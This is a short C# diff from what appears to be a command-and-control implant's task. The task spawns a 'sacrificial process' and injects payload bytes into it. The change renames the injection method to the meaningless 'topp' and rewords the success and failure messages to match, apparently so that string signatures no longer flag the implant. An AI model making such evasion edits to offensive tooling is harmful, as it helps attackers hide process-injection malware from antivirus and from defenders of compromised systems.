@@ -40,13 +40,13 @@ namespace Tasks
                 var proc = _agent.GetProcessManager().NewProcess(startupArgs.Application, startupArgs.Arguments, true);
                 if (proc.Start())
                 {
-                    if (proc.Inject(fileBytes))
+                    if (proc.topp(fileBytes))
                     {
-                        resp = CreateTaskResponse($"Successfully injected into {startupArgs.Application} ({proc.PID})", true);
+                        resp = CreateTaskResponse($"Successfully topped into {startupArgs.Application} ({proc.PID})", true);
                     }
                     else
                     {
-                        resp = CreateTaskResponse("Failed to inject into sacrificial process.", true, "error");
+                        resp = CreateTaskResponse("Failed to topp into sacrificial process.", true, "error");
                     }
                 }
                 else
